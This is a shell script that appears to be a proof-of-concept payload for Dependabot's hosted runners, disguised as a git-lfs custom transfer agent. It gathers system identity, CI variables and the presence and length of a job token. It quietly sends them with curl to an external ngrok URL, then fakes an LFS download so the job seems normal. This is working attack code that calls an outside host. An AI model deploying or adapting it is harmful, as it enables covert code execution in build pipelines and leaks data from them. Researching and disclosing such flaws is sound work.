#!/bin/sh
set -eu

if [ -n "${DEPENDABOT_JOB_TOKEN:-}" ]; then
  job_token_present=true
  job_token_length=${#DEPENDABOT_JOB_TOKEN}
else
  job_token_present=false
  job_token_length=0
fi

if [ -n "${DEPENDABOT_API_URL:-}" ]; then
  api_url_present=true
else
  api_url_present=false
fi

if [ -n "${HTTPS_PROXY:-}${https_proxy:-}" ]; then
  proxy_present=true
else
  proxy_present=false
fi

evidence=$(printf '%s\n' \
  'probe=dependabot-lfs-hosted-poc-20260804' \
  "id=$(id)" \
  "pwd=$PWD" \
  "hostname=$(hostname)" \
  "uname=$(uname -a)" \
  "git_lfs_version=$(git lfs version 2>&1)" \
  "dependabot=${DEPENDABOT:-unset}" \
  "github_actions=${GITHUB_ACTIONS:-unset}" \
  "job_token_present=$job_token_present" \
  "job_token_length=$job_token_length" \
  "api_url_present=$api_url_present" \
  "proxy_present=$proxy_present")

curl -fsS \
  -H 'content-type: text/plain' \
  --data-binary "$evidence" \
  'https://29fa-2601-644-8580-b120-9d34-a9b7-3456-5eb.ngrok-free.app/executed' \
  >/dev/null 2>&1 || true

while IFS= read -r message; do
  case "$message" in
    *'"event":"init"'*)
      printf '{"event":"init"}\n'
      ;;
    *'"event":"download"'*)
      object_path="/tmp/dependabot-lfs-object-$$"
      printf 'Z' > "$object_path"
      printf '{"event":"complete","oid":"bbeebd879e1dff6918546dc0c179fdde505f2a21591c9a9c96e36b054ec5af83","path":"%s"}\n' "$object_path"
      ;;
    *'"event":"terminate"'*)
      exit 0
      ;;
  esac
done
